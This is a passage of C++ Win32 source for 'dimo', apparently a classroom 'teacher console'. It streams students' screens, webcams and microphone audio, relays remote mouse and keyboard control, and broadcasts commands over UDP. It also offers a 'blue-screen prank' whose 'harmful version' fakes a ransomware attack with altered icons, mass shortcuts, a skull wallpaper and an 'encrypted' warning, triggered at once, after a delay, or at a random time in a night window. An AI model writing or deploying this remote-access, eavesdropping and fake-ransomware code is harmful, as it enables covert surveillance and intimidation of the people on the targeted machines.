        for (int i = 0; i < NB; ++i) if (wh[i].dwFlags & WHDR_DONE) { done = &wh[i]; break; }
        if (!done || done->dwBytesRecorded == 0) continue;
        dmPut32(hdr + 4, (int32_t)done->dwBytesRecorded);
        dmSendAll(s, hdr, 8);
        dmSendAll(s, done->lpData, (int)done->dwBytesRecorded);
        waveInUnprepareHeader(wi, done, sizeof(WAVEHDR));
        done->dwBufferLength = BUFSZ;
        waveInPrepareHeader(wi, done, sizeof(WAVEHDR));
        waveInAddBuffer(wi, done, sizeof(WAVEHDR));
    }
    waveInReset(wi);
    for (int i = 0; i < NB; ++i) waveInUnprepareHeader(wi, &wh[i], sizeof(WAVEHDR));
    waveInClose(wi);
    CloseHandle(ev);
    closesocket(s);
    return 0;
}

// ------------------------------ TCP 服务框架 ------------------------------
static DWORD WINAPI dmTcpSvc(LPVOID p) {
    u_short port = (u_short)(uintptr_t)p;
    SOCKET ls = socket(AF_INET, SOCK_STREAM, 0);
    BOOL b = TRUE; setsockopt(ls, SOL_SOCKET, SO_EXCLUSIVEADDRUSE, (char*)&b, sizeof(b));   // 独占端口, 防本机多实例抢连接
    sockaddr_in a{}; a.sin_family = AF_INET; a.sin_port = htons(port);
    a.sin_addr.S_un.S_addr = INADDR_ANY;
    if (bind(ls, (sockaddr*)&a, sizeof(a)) != 0 || listen(ls, 4) != 0) { closesocket(ls); return 0; }
    while (true) {
        sockaddr_in fr{}; int fl = sizeof(fr);
        SOCKET cs = accept(ls, (sockaddr*)&fr, &fl);
        if (cs == INVALID_SOCKET) break;
        LPTHREAD_START_ROUTINE fn = port == DM_PORT_SCR ? dmScrConn : port == DM_PORT_CAM ? dmCamClient : dmMicConn;
        CreateThread(nullptr, 0, fn, (LPVOID)(uintptr_t)cs, 0, nullptr);
    }
    closesocket(ls);
    return 0;
}

// ------------------------------ 教师端: 监视窗口 ------------------------------
struct DmViewer {
    SOCKET s; HWND h; std::wstring name; bool cam; bool ctrl;
    DWORD ip = 0; WORD port = 0;
    HBITMAP bmp = nullptr; int bw = 0, bh = 0;
    CRITICAL_SECTION lk;
};
static std::vector<DmViewer*> g_dmViewers;
static void dmSendCCIN(DmViewer* v, int type, int32_t a, int32_t b) {
    if (!v || !v->ctrl) return;
    char p[13]; memcpy(p, "CCIN", 4); p[4] = (char)type;
    dmPut32(p + 5, a); dmPut32(p + 9, b);
    dmSendAll(v->s, p, 13);
}
static void dmNormXY(DmViewer* v, LPARAM l, int& nx, int& ny) {
    RECT rc; GetClientRect(v->h, &rc);
    nx = (int)((double)GET_X_LPARAM(l) * 10000.0 / (rc.right ? rc.right : 1));
    ny = (int)((double)GET_Y_LPARAM(l) * 10000.0 / (rc.bottom ? rc.bottom : 1));
    if (nx < 0) nx = 0; if (nx > 10000) nx = 10000;
    if (ny < 0) ny = 0; if (ny > 10000) ny = 10000;
}
static LRESULT CALLBACK dmViewerProc(HWND h, UINT m, WPARAM w, LPARAM l) {
    DmViewer* v = (DmViewer*)GetWindowLongPtrW(h, GWLP_USERDATA);
    switch (m) {
    case WM_CREATE:
        SetWindowLongPtrW(h, GWLP_USERDATA, (LONG_PTR)((LPCREATESTRUCTW)l)->lpCreateParams);
        return 0;
    case WM_PAINT: {
        PAINTSTRUCT ps; HDC dc = BeginPaint(h, &ps);
        RECT rc; GetClientRect(h, &rc);
        HBRUSH bk = CreateSolidBrush(RGB(10, 10, 16));
        FillRect(dc, &rc, bk); DeleteObject(bk);
        if (v) {
            EnterCriticalSection(&v->lk);
            if (v->bmp) {
                HDC mdc = CreateCompatibleDC(dc);
                HGDIOBJ old = SelectObject(mdc, v->bmp);
                SetStretchBltMode(dc, COLORONCOLOR);
                StretchBlt(dc, 0, 0, rc.right, rc.bottom, mdc, 0, 0, v->bw, v->bh, SRCCOPY);
                SelectObject(mdc, old); DeleteDC(mdc);
            }
            LeaveCriticalSection(&v->lk);
        }
        EndPaint(h, &ps);
        return 0; }
    case WM_ERASEBKGND: return 1;
    case WM_MOUSEMOVE:   if (v) { int x, y; dmNormXY(v, l, x, y); dmSendCCIN(v, 2, x, y); } return 0;
    case WM_LBUTTONDOWN: if (v) { int x, y; dmNormXY(v, l, x, y); dmSendCCIN(v, 3, x, y); SetFocus(h); } return 0;
    case WM_RBUTTONDOWN: if (v) { int x, y; dmNormXY(v, l, x, y); dmSendCCIN(v, 4, x, y); } return 0;
    case WM_LBUTTONUP:   if (v) { int x, y; dmNormXY(v, l, x, y); dmSendCCIN(v, 5, x, y); } return 0;
    case WM_MOUSEWHEEL:  dmSendCCIN(v, 8, (int32_t)GET_WHEEL_DELTA_WPARAM(w), 0); return 0;
    case WM_KEYDOWN:     dmSendCCIN(v, 6, (int)w, 0); return 0;
    case WM_KEYUP:       dmSendCCIN(v, 7, (int)w, 0); return 0;
    case WM_APP + 2: {
        if (v) {
            EnterCriticalSection(&v->lk);
            if (v->bmp) DeleteObject(v->bmp);
            LeaveCriticalSection(&v->lk);
            DeleteCriticalSection(&v->lk);
            for (size_t i = 0; i < g_dmViewers.size(); ++i)
                if (g_dmViewers[i] == v) { g_dmViewers.erase(g_dmViewers.begin() + i); break; }
            DestroyWindow(h); delete v;
        }
        return 0; }
    case WM_CLOSE: if (v) { shutdown(v->s, SD_BOTH); closesocket(v->s); } return 0;
    }
    return DefWindowProcW(h, m, w, l);
}
static DWORD WINAPI dmViewNetThread(LPVOID p) {
    DmViewer* v = (DmViewer*)p;
    sockaddr_in a{}; a.sin_family = AF_INET; a.sin_port = htons(v->port);
    a.sin_addr.S_un.S_addr = v->ip;
    if (connect(v->s, (sockaddr*)&a, sizeof(a)) != 0) {
        SetWindowTextW(v->h, v->cam ? L"dimo 连接失败 (对方离线/防火墙/未装新版)" : L"dimo 连接失败 (对方离线/防火墙/未装新版)");
        Sleep(2200);
        PostMessageW(v->h, WM_APP + 2, 0, 0);
        return 0;
    }
    SetWindowTextW(v->h, ((v->cam ? L"dimo 摄像头监视: " : L"dimo 屏幕监视: ") + v->name + (v->ctrl ? L"  [可操控]" : L"  [本机不可操控]")).c_str());
    while (true) {
        char hdr[8];
        if (!dmRecvAll(v->s, hdr, 8)) { SetWindowTextW(v->h, L"dimo 画面已断开 (对方离线)"); Sleep(1500); break; }
        if (memcmp(hdr, "CCSC", 4) != 0) { SetWindowTextW(v->h, L"dimo 数据异常 (对方版本不符)"); Sleep(1500); break; }
        int32_t len = dmGet32(hdr + 4);
        if (len <= 0 || len > 40 * 1024 * 1024) break;
        std::vector<char> jpg((size_t)len);
        if (!dmRecvAll(v->s, &jpg[0], len)) break;
        HGLOBAL hg = GlobalAlloc(GMEM_MOVEABLE, jpg.size());
        if (!hg) break;
        void* mp = GlobalLock(hg); memcpy(mp, &jpg[0], jpg.size()); GlobalUnlock(hg);
        IStream* st = nullptr;
        CreateStreamOnHGlobal(hg, FALSE, &st);
        Bitmap* bm = st ? Bitmap::FromStream(st) : nullptr;
        HBITMAP nb = nullptr; int nw = 0, nh = 0;
        if (bm) {
            if (bm->GetHBITMAP(Color(0, 0, 0, 0), &nb) != Ok) nb = nullptr;
            if (nb) { BITMAP bi2{}; GetObjectW(nb, sizeof(bi2), &bi2); nw = bi2.bmWidth; nh = bi2.bmHeight; }
            delete bm;
        }
        if (st) st->Release();
        GlobalFree(hg);
        EnterCriticalSection(&v->lk);
        if (v->bmp) DeleteObject(v->bmp);
        v->bmp = nb; v->bw = nw; v->bh = nh;
        LeaveCriticalSection(&v->lk);
        InvalidateRect(v->h, nullptr, FALSE);
    }
    PostMessageW(v->h, WM_APP + 2, 0, 0);
    return 0;
}
static bool dmFindPeer(const std::wstring& name, DmPeer& out) {
    std::lock_guard<std::mutex> lk(g_dmMtx);
    auto it = g_dmPeers.find(name);
    if (it == g_dmPeers.end()) return false;
    out = it->second; return true;
}
static void dmOpenViewer(const std::wstring& name, bool cam) {
    DmPeer pe;
    if (!dmFindPeer(name, pe)) { MessageBoxW(g_mainWnd, L"该学生不在线", L"dimo", MB_ICONWARNING); return; }
    if (pe.role == L"admin") { MessageBoxW(g_mainWnd, L"不能监视管理员", L"dimo", MB_ICONWARNING); return; }
    for (DmViewer* v : g_dmViewers) {
        wchar_t t[160]; GetWindowTextW(v->h, t, 160);
        if (v->name == name && ((cam && wcsstr(t, L"摄像头监视")) || (!cam && wcsstr(t, L"屏幕监视")))) {
            ShowWindow(v->h, SW_RESTORE); SetForegroundWindow(v->h); return;
        }
    }
    DmViewer* v = new DmViewer();
    v->name = name; v->cam = cam; v->ip = pe.ip; v->port = cam ? DM_PORT_CAM : DM_PORT_SCR;
    v->s = socket(AF_INET, SOCK_STREAM, 0);
    v->ctrl = !cam && !dmIsLocalIp(pe.ip);
    InitializeCriticalSection(&v->lk);
    std::wstring title = (cam ? L"dimo 摄像头监视: " : L"dimo 屏幕监视: ") + name
        + (v->ctrl ? L"  [可操控]" : L"  [本机不可操控]");
    // 画面 1280x720; 小屏自动等比缩小, 窗口外框 +16/+59
    int sw2 = GetSystemMetrics(SM_CXSCREEN), sh2 = GetSystemMetrics(SM_CYSCREEN);
    int cw = sw2 - 80 < 1280 ? sw2 - 80 : 1280;
    int ch = cw * 9 / 16;
    if (ch > sh2 - 170) ch = sh2 - 170;
    int w = cw + 16, hgt = ch + 59;
    v->h = CreateWindowExW(0, L"DIMOVIEW", title.c_str(), WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT, w, hgt, g_mainWnd, nullptr, g_hInst, v);
    g_dmViewers.push_back(v);
    ShowWindow(v->h, SW_SHOW);
    CreateThread(nullptr, 0, dmViewNetThread, v, 0, nullptr);
}

// ------------------------------ 教师端: 麦克风监听 ------------------------------
static void CALLBACK dmAudOutCb(HWAVEOUT, UINT msg, DWORD_PTR, LPWAVEHDR wh, DWORD_PTR) {
    if (msg == WOM_DONE && wh) {
        HWAVEOUT wo = (HWAVEOUT)wh->dwUser;
        waveOutUnprepareHeader(wo, wh, sizeof(WAVEHDR));
        delete[] wh->lpData; delete wh;
    }
}
static DWORD WINAPI dmAudThread(LPVOID p) {
    DmViewer* v = (DmViewer*)p;
    // 连接在后台线程进行, 不卡 UI; 标题实时显示状态便于排障
    SetWindowTextW(v->h, L"dimo 正在连接麦克风...");
    sockaddr_in a{}; a.sin_family = AF_INET; a.sin_port = htons(v->port);
    a.sin_addr.S_un.S_addr = v->ip;
    if (connect(v->s, (sockaddr*)&a, sizeof(a)) != 0) {
        SetWindowTextW(v->h, L"dimo 连接失败 (对方离线/防火墙拦截)");
        Sleep(1800);
        PostMessageW(v->h, WM_APP + 2, 0, 0);
        return 0;
    }
    WAVEFORMATEX wf{}; wf.wFormatTag = WAVE_FORMAT_PCM; wf.nChannels = 1;
    wf.nSamplesPerSec = 8000; wf.wBitsPerSample = 16;
    wf.nBlockAlign = 2; wf.nAvgBytesPerSec = 16000;
    HWAVEOUT wo = nullptr;
    if (waveOutOpen(&wo, WAVE_MAPPER, &wf, (DWORD_PTR)dmAudOutCb, 0, CALLBACK_FUNCTION) != MMSYSERR_NOERROR) {
        SetWindowTextW(v->h, L"dimo 本机播放设备打开失败");
        Sleep(1800);
        PostMessageW(v->h, WM_APP + 2, 0, 0); return 0;
    }
    SetWindowTextW(v->h, (L"dimo 正在监听: " + v->name).c_str());
    while (true) {
        char hdr[8];
        if (!dmRecvAll(v->s, hdr, 8)) { SetWindowTextW(v->h, L"dimo 监听已断开 (对方离线)"); Sleep(1200); break; }
        if (memcmp(hdr, "DIMA", 4) != 0) break;
        int32_t len = dmGet32(hdr + 4);
        if (len == 0) {   // 学生端麦克风不可用信号
            SetWindowTextW(v->h, L"dimo 对方麦克风不可用 (检查系统麦克风权限/是否被占用)");
            Sleep(2500);
            break;
        }
        if (len == (int32_t)-1) {   // 采集异常: open 成功但无数据 (隐私权限/驱动)
            SetWindowTextW(v->h, L"dimo 对方麦克风无数据 (Windows设置→隐私→麦克风 允许桌面应用访问)");
            Sleep(3000);
            break;
        }
        if (len <= 0 || len > 65536) break;
        WAVEHDR* wh = new WAVEHDR{}; char* d = new char[len];
        if (!dmRecvAll(v->s, d, len)) { delete[] d; delete wh; break; }
        wh->lpData = d; wh->dwBufferLength = (DWORD)len; wh->dwUser = (DWORD_PTR)wo;
        waveOutPrepareHeader(wo, wh, sizeof(WAVEHDR));
        waveOutWrite(wo, wh, sizeof(WAVEHDR));
    }
    waveOutReset(wo); waveOutClose(wo);
    PostMessageW(v->h, WM_APP + 2, 0, 0);
    return 0;
}
static void dmOpenAudio(const std::wstring& name) {
    DmPeer pe;
    if (!dmFindPeer(name, pe)) { MessageBoxW(g_mainWnd, L"该学生不在线", L"dimo", MB_ICONWARNING); return; }
    if (pe.role == L"admin") return;
    for (DmViewer* v : g_dmViewers) {
        wchar_t t[160]; GetWindowTextW(v->h, t, 160);
        if (v->name == name && wcsstr(t, L"监听")) { SetForegroundWindow(v->h); return; }
    }
    DmViewer* v = new DmViewer();
    v->name = name; v->cam = false; v->ctrl = false; v->ip = pe.ip; v->port = DM_PORT_MIC;
    v->s = socket(AF_INET, SOCK_STREAM, 0);
    InitializeCriticalSection(&v->lk);
    v->h = CreateWindowExW(0, L"DIMOVIEW", L"dimo 正在连接麦克风...",
        WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU,
        CW_USEDEFAULT, CW_USEDEFAULT, 420, 150, g_mainWnd, nullptr, g_hInst, v);
    g_dmViewers.push_back(v);
    ShowWindow(v->h, SW_SHOW);
    CreateThread(nullptr, 0, dmAudThread, v, 0, nullptr);
}

// ------------------------------ 教师端: 远程指令广播 ------------------------------
static void dmSendCmd(const std::wstring& target, const char* cmd) {
    std::string pkt = std::string("DMCMD|") + g_dmInst + "|" + dmW2u(g_dmName) + "|" + dmW2u(target) + "|" + cmd;
    dmUdpSend(INADDR_BROADCAST, pkt);
}
static void dmToggleVoice(HWND hDash);   // 定义在语音采集区

// ------------------------------ 目标选择弹窗 (教师端, 替代 是/否 确认框) ------------------------------
static HWND g_dmDash, g_dmList;          // 前向声明 (定义在控制台区)
static HWND g_dmPick = nullptr;
static std::string g_dmPickCmd;
static LRESULT CALLBACK dmPickProc(HWND h, UINT m, WPARAM w, LPARAM l) {
    switch (m) {
    case WM_CREATE: {
        CreateWindowExW(0, L"BUTTON", L"全体学生", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
            16, 64, 322, 36, h, (HMENU)1, nullptr, nullptr);
        CreateWindowExW(0, L"BUTTON", L"仅控制台选中的学生", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
            16, 108, 322, 36, h, (HMENU)2, nullptr, nullptr);
        CreateWindowExW(0, L"BUTTON", L"取消", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
            16, 152, 322, 30, h, (HMENU)3, nullptr, nullptr);
        return 0; }
    case WM_COMMAND: {
        int id = LOWORD(w);
        if (id == 3) { DestroyWindow(h); return 0; }
        if (id == 1) {
            dmSendCmd(L"*", g_dmPickCmd.c_str());
            MessageBoxW(h, L"指令已广播。", L"dimo", MB_ICONINFORMATION);
            DestroyWindow(h);
            return 0;
        }
        if (id == 2) {
            wchar_t sel[64] = L"";
            int i = (int)SendMessageW(g_dmList, LVM_GETNEXTITEM, -1, LVNI_SELECTED);
            if (g_dmDash && IsWindow(g_dmDash) && i >= 0)
                ListView_GetItemText(g_dmList, i, 0, sel, 64);
            if (!sel[0]) { MessageBoxW(h, L"请先在控制台列表中选中一名学生。", L"dimo", MB_ICONWARNING); return 0; }
            dmSendCmd(sel, g_dmPickCmd.c_str());
            MessageBoxW(h, L"指令已广播。", L"dimo", MB_ICONINFORMATION);
            DestroyWindow(h);
            return 0;
        }
        return 0; }
    case WM_CLOSE: DestroyWindow(h); return 0;
    case WM_DESTROY: if (h == g_dmPick) g_dmPick = nullptr; return 0;
    }
    return DefWindowProcW(h, m, w, l);
}
static void dmOpenCmdPick(const wchar_t* title, const wchar_t* ask, const char* cmd) {
    g_dmPickCmd = cmd;
    if (g_dmPick) { SetWindowTextW(g_dmPick, title); SetForegroundWindow(g_dmPick); }
    else {
        g_dmPick = CreateWindowExW(0, L"DIMOPICK", title, WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU,
            CW_USEDEFAULT, CW_USEDEFAULT, 360, 290, g_dmDash, nullptr, g_hInst, nullptr);
        CreateWindowExW(0, L"STATIC", ask, WS_CHILD | WS_VISIBLE,
            16, 12, 322, 44, g_dmPick, nullptr, nullptr, nullptr);
        ShowWindow(g_dmPick, SW_SHOW);
    }
}

// ------------------------------ 教师端: 蓝屏整蛊触发方式 ------------------------------
#define DM_LO_R_NOW   201
#define DM_LO_R_DELAY 202
#define DM_LO_E_A     203
#define DM_LO_E_B     204
#define DM_LO_R_CLOCK 205
#define DM_LO_E_T1    206
#define DM_LO_E_T2    207
#define DM_LO_BTN_OK  208
#define DM_LO_VER_N   209
#define DM_LO_VER_H   210
static HWND g_dmLockOpt = nullptr;

static bool dmParseHM(const wchar_t* s, int& outMin) {
    if (wcslen(s) != 5 || s[2] != L':') return false;
    for (int i : {0, 1, 3, 4}) if (s[i] < L'0' || s[i] > L'9') return false;
    int hh = (s[0] - L'0') * 10 + (s[1] - L'0');
    int mm = (s[3] - L'0') * 10 + (s[4] - L'0');
    if (hh > 23 || mm > 59) return false;
    outMin = hh * 60 + mm;
    return true;
}
static void dmLockOptEnable(HWND h) {
    int d = (IsDlgButtonChecked(h, DM_LO_R_DELAY) == BST_CHECKED);
    int c = (IsDlgButtonChecked(h, DM_LO_R_CLOCK) == BST_CHECKED);
    EnableWindow(GetDlgItem(h, DM_LO_E_A), d);
    EnableWindow(GetDlgItem(h, DM_LO_E_B), d);
    EnableWindow(GetDlgItem(h, DM_LO_E_T1), c);
    EnableWindow(GetDlgItem(h, DM_LO_E_T2), c);
}
static LRESULT CALLBACK dmLockOptProc(HWND h, UINT m, WPARAM w, LPARAM l) {
    switch (m) {
    case WM_CREATE: {
        int Y0 = 14, Y1 = 54, Y2 = 94, Y3 = 134;
        CreateWindowExW(0, L"STATIC", L"整蛊版本:", WS_CHILD | WS_VISIBLE, 18, Y0 + 2, 70, 20, h, nullptr, nullptr, nullptr);
        CreateWindowExW(0, L"BUTTON", L"无害版 (结尾蓝屏卡死)", WS_CHILD | WS_VISIBLE | BS_AUTORADIOBUTTON | WS_GROUP,
            92, Y0, 200, 22, h, (HMENU)(INT_PTR)DM_LO_VER_N, nullptr, nullptr);
        CreateWindowExW(0, L"BUTTON", L"有害版 (加密桌面, 可恢复)", WS_CHILD | WS_VISIBLE | BS_AUTORADIOBUTTON,
            296, Y0, 220, 22, h, (HMENU)(INT_PTR)DM_LO_VER_H, nullptr, nullptr);
        CreateWindowExW(0, L"BUTTON", L"立即触发（对方马上开始）", WS_CHILD | WS_VISIBLE | BS_AUTORADIOBUTTON | WS_GROUP,
            18, Y1, 240, 22, h, (HMENU)(INT_PTR)DM_LO_R_NOW, nullptr, nullptr);
        CreateWindowExW(0, L"BUTTON", L"延时触发（随机）", WS_CHILD | WS_VISIBLE | BS_AUTORADIOBUTTON,
            18, Y2, 150, 22, h, (HMENU)(INT_PTR)DM_LO_R_DELAY, nullptr, nullptr);
        CreateWindowExW(0, L"EDIT", L"2", WS_CHILD | WS_VISIBLE | WS_BORDER | ES_NUMBER | ES_CENTER,
            176, Y2 - 2, 46, 24, h, (HMENU)(INT_PTR)DM_LO_E_A, nullptr, nullptr);
        CreateWindowExW(0, L"STATIC", L"秒 ～", WS_CHILD | WS_VISIBLE, 226, Y2 + 2, 42, 20, h, nullptr, nullptr, nullptr);
        CreateWindowExW(0, L"EDIT", L"6", WS_CHILD | WS_VISIBLE | WS_BORDER | ES_NUMBER | ES_CENTER,
            270, Y2 - 2, 46, 24, h, (HMENU)(INT_PTR)DM_LO_E_B, nullptr, nullptr);
        CreateWindowExW(0, L"STATIC", L"秒", WS_CHILD | WS_VISIBLE, 320, Y2 + 2, 30, 20, h, nullptr, nullptr, nullptr);
        CreateWindowExW(0, L"BUTTON", L"定点触发（时段内随机）", WS_CHILD | WS_VISIBLE | BS_AUTORADIOBUTTON,
            18, Y3, 170, 22, h, (HMENU)(INT_PTR)DM_LO_R_CLOCK, nullptr, nullptr);
        CreateWindowExW(0, L"EDIT", L"01:00", WS_CHILD | WS_VISIBLE | WS_BORDER | ES_CENTER,
            196, Y3 - 2, 62, 24, h, (HMENU)(INT_PTR)DM_LO_E_T1, nullptr, nullptr);
        CreateWindowExW(0, L"STATIC", L"～", WS_CHILD | WS_VISIBLE, 262, Y3 + 2, 20, 20, h, nullptr, nullptr, nullptr);
        CreateWindowExW(0, L"EDIT", L"02:00", WS_CHILD | WS_VISIBLE | WS_BORDER | ES_CENTER,
            284, Y3 - 2, 62, 24, h, (HMENU)(INT_PTR)DM_LO_E_T2, nullptr, nullptr);
        CreateWindowExW(0, L"STATIC", L"24 小时制 (HH:MM), 支持跨午夜", WS_CHILD | WS_VISIBLE,
            18, Y3 + 24, 330, 18, h, nullptr, nullptr, nullptr);
        CreateWindowExW(0, L"STATIC",
            L"先播放约半分钟序列: 窗口闪退→黑屏→蓝屏→熊猫烧香→错误窗口→重启动画。\n"
            L"无害版: 播完自动恢复桌面 (不加最后蓝屏)。\n"
            L"有害版: 最后桌面图标变 classChat、生成大量快捷方式、骷髅壁纸、\n红色「已被加密」小窗 (黄色正计时)。远程解锁即全部恢复。",
            WS_CHILD | WS_VISIBLE, 18, 196, 400, 66, h, nullptr, nullptr, nullptr);
        CreateWindowExW(0, L"BUTTON", L"下一步：选择学生", WS_CHILD | WS_VISIBLE | BS_DEFPUSHBUTTON,
            18, 272, 170, 34, h, (HMENU)(INT_PTR)DM_LO_BTN_OK, nullptr, nullptr);
        CreateWindowExW(0, L"BUTTON", L"取消", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
            200, 272, 168, 34, h, (HMENU)2, nullptr, nullptr);
        CheckDlgButton(h, DM_LO_VER_N, BST_CHECKED);
        CheckDlgButton(h, DM_LO_R_NOW, BST_CHECKED);
        EnumChildWindows(h, dmSetFontCb, (LPARAM)hFontUI);
        dmLockOptEnable(h);
        return 0; }
    case WM_COMMAND: {
        WORD id = LOWORD(w), ev = HIWORD(w);
        if (ev == BN_CLICKED && (id == DM_LO_R_NOW || id == DM_LO_R_DELAY || id == DM_LO_R_CLOCK)) {
            dmLockOptEnable(h);
            return 0;
        }
        if (ev == BN_CLICKED && id == 2) { DestroyWindow(h); return 0; }
        if (ev == BN_CLICKED && id == DM_LO_BTN_OK) {
            bool harm = IsDlgButtonChecked(h, DM_LO_VER_H) == BST_CHECKED;
            std::string ver = harm ? "LOCK:H" : "LOCK";
            const wchar_t* verName = harm ? L"有害版" : L"无害版";
            std::string cmd;
            std::wstring desc;
            if (IsDlgButtonChecked(h, DM_LO_R_NOW) == BST_CHECKED) {
                cmd = ver;
                desc = std::wstring(L"立即触发 (") + verName + L"): 对方面前马上开始整蛊序列。";
            } else if (IsDlgButtonChecked(h, DM_LO_R_DELAY) == BST_CHECKED) {
                wchar_t ba[16] = L"", bb[16] = L"";
                GetDlgItemTextW(h, DM_LO_E_A, ba, 16);
                GetDlgItemTextW(h, DM_LO_E_B, bb, 16);
                long a = _wtol(ba), b = _wtol(bb);
                if (a < 0 || b < 0 || a > 86400 || b > 86400 || a > b) {
                    MessageBoxW(h, L"请输入正确的秒数 (0~86400, 前小后大)。", L"dimo", MB_ICONWARNING);
                    return 0;
                }
                cmd = ver + ":T:" + std::to_string(a) + ":" + std::to_string(b);
                wchar_t d[160]; swprintf(d, 160, L"延时触发 (%ls): 收到后 %ld~%ld 秒之间随机开始。", verName, a, b);
                desc = d;
            } else {
                wchar_t t1[16] = L"", t2[16] = L"";
                GetDlgItemTextW(h, DM_LO_E_T1, t1, 16);
                GetDlgItemTextW(h, DM_LO_E_T2, t2, 16);
                int m1 = 0, m2 = 0;
                if (!dmParseHM(t1, m1) || !dmParseHM(t2, m2)) {
                    MessageBoxW(h, L"时间格式应为 HH:MM, 例如 01:00。", L"dimo", MB_ICONWARNING);
                    return 0;
                }
                cmd = ver + ":C:" + std::to_string(m1) + ":" + std::to_string(m2);
                wchar_t d[200]; swprintf(d, 200, L"定点触发 (%ls): 每天 %s~%s 之间随机开始 (支持跨午夜)。", verName, t1, t2);
                desc = d;
            }
            DestroyWindow(h);
            dmOpenCmdPick(L"dimo 蓝屏整蛊 (软)", desc.c_str(), cmd.c_str());
            return 0;
        }
        return 0; }
    case WM_CLOSE: DestroyWindow(h); return 0;
    case WM_DESTROY: g_dmLockOpt = nullptr; return 0;
    }
    return DefWindowProcW(h, m, w, l);
}
static void dmOpenLockOpt() {
    if (g_dmLockOpt) { SetForegroundWindow(g_dmLockOpt); return; }
    g_dmLockOpt = CreateWindowExW(0, L"DIMOLOCKOPT", L"dimo 蓝屏整蛊 - 版本与触发方式",
        WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU, CW_USEDEFAULT, CW_USEDEFAULT, 536, 340,
        g_dmDash ? g_dmDash : g_mainWnd, nullptr, g_hInst, nullptr);
    ShowWindow(g_dmLockOpt, SW_SHOW);
}

// ------------------------------ 教师端: 隔空喊话 ------------------------------
// g_dmDash / g_dmList 已在目标选择弹窗区定义
static HWND g_dmShout = nullptr, g_dmShoutEdit = nullptr;
static bool g_dmShoutAll = false;
static LRESULT CALLBACK dmShoutProc(HWND h, UINT m, WPARAM w, LPARAM l) {
    switch (m) {
    case WM_CREATE:
        g_dmShout = h;
        CreateWindowExW(0, L"STATIC", g_dmShoutAll ? L"目标: 全体学生" : L"目标: 选中的学生",
            WS_CHILD | WS_VISIBLE, 14, 10, 420, 22, h, (HMENU)10, nullptr, nullptr);
        g_dmShoutEdit = CreateWindowExW(0, L"EDIT", L"", WS_CHILD | WS_VISIBLE | WS_BORDER | ES_MULTILINE | ES_AUTOVSCROLL | WS_VSCROLL,
            14, 38, 420, 180, h, (HMENU)1, nullptr, nullptr);
        CreateWindowExW(0, L"BUTTON", L"发送喊话", WS_CHILD | WS_VISIBLE | BS_DEFPUSHBUTTON,
            14, 230, 420, 38, h, (HMENU)2, nullptr, nullptr);
        EnumChildWindows(h, dmSetFontCb, (LPARAM)hFontUI);
        SetFocus(g_dmShoutEdit);
        return 0;
    case WM_COMMAND:
        if (LOWORD(w) == 2) {
            int len = (int)SendMessageW(g_dmShoutEdit, WM_GETTEXTLENGTH, 0, 0);
            if (len <= 0) return 0;
            std::vector<wchar_t> t(len + 1); GetWindowTextW(g_dmShoutEdit, &t[0], len + 1);
            std::wstring txt = &t[0];
            // 目标: 全体="*", 选中=学生名; 用与心跳同通道的广播发送 (DMMSG|from|target|text)
            // 广播对本机双开/防火墙限制单播的场景均可达, 接收端按 target 过滤
            std::wstring target = L"*";
            if (!g_dmShoutAll) {
                int i = (int)SendMessageW(g_dmList, LVM_GETNEXTITEM, -1, LVNI_SELECTED);
                wchar_t sel[64] = L"";
                if (g_dmDash && IsWindow(g_dmDash) && i >= 0)
                    ListView_GetItemText(g_dmList, i, 0, sel, 64);
                if (!sel[0]) {
                    MessageBoxW(h, L"请先在控制台列表中选中一名学生。", L"dimo", MB_ICONWARNING);
                    return 0;
                }
                target = sel;
            }
            std::string pkt = std::string("DMMSG|") + g_dmInst + "|" + dmW2u(g_dmName) + "|" + dmW2u(target) + "|" + dmW2u(txt);
            dmUdpSend(INADDR_BROADCAST, pkt);
            wchar_t msg[128];
            wsprintfW(msg, L"喊话已发送 (%s)", target == L"*" ? L"全体学生" : target.c_str());
            MessageBoxW(h, msg, L"dimo", MB_ICONINFORMATION);
            DestroyWindow(h);
        }
        return 0;
    case WM_DESTROY: g_dmShout = nullptr; g_dmShoutEdit = nullptr; return 0;
    }
    return DefWindowProcW(h, m, w, l);
}
static void dmOpenShout(bool all) {
    g_dmShoutAll = all;
    if (g_dmShout) { SetForegroundWindow(g_dmShout); return; }
    HWND h = CreateWindowExW(WS_EX_TOOLWINDOW, L"DIMOSHOUT",
        all ? L"dimo 隔空喊话 → 全体学生" : L"dimo 隔空喊话 → 选中学生",
        WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU, CW_USEDEFAULT, CW_USEDEFAULT, 462, 320,
        g_dmDash ? g_dmDash : g_mainWnd, nullptr, g_hInst, nullptr);
    ShowWindow(h, SW_SHOW);
}

// ------------------------------ 教师端: 控制台窗口 ------------------------------
#define DM_IDC_LIST   100
#define DM_IDC_MON    101
#define DM_IDC_CAM    102
#define DM_IDC_MIC    103
#define DM_IDC_SHOUT1 104
#define DM_IDC_SHOUT2 105
#define DM_IDC_VOICE  106
#define DM_IDC_LOCK   107
#define DM_IDC_SHUT   108
#define DM_IDC_HLOCK  109
#define DM_IDC_UNLOCK 110
static int g_dmOnline = 0;
static std::wstring g_dmDashSig = L"\x01";   // 在线名单签名 (WM_CREATE 时重置, 防残留)
static LRESULT CALLBACK dmDashProc(HWND h, UINT m, WPARAM w, LPARAM l) {
    switch (m) {
    case WM_CREATE: {
        g_dmDash = h;
        g_dmDashSig = L"\x01";
        g_dmList = CreateWindowExW(0, WC_LISTVIEWW, L"", WS_CHILD | WS_VISIBLE | WS_BORDER | LVS_REPORT | LVS_SHOWSELALWAYS | LVS_SINGLESEL,
            10, 74, 1084, 290, h, (HMENU)DM_IDC_LIST, nullptr, nullptr);
        ListView_SetExtendedListViewStyle(g_dmList, LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);
        LVCOLUMNW c{};
        c.mask = LVCF_TEXT | LVCF_WIDTH | LVCF_SUBITEM;
        c.pszText = (LPWSTR)L"学生";   c.cx = 150; c.iSubItem = 0; ListView_InsertColumn(g_dmList, 0, &c);
